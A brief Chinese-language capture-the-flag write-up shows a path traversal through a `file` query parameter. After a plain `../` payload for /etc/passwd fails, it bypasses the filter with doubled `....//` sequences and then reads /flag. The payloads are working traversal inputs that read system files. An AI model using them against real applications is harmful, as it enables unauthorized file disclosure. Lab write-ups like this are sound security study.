## 双写绕过

 发现 `file` 参数是文件名形式

![](https://pic1.imgdb.cn/item/68386eeb58cb8da5c81ae6f2.png)

尝试直接读取 `/etc/passwd` 无果

```js
?file=../../../../../etc/passwd
```

![](https://pic1.imgdb.cn/item/6838704458cb8da5c81ae772.png)

双写可以绕过

```js
?file=....//....//....//....//....//etc/passwd
```

![](https://pic1.imgdb.cn/item/6838708258cb8da5c81ae79d.png)

换成 `/flag` 通关

```js
?file=....//....//....//....//....//flag
```
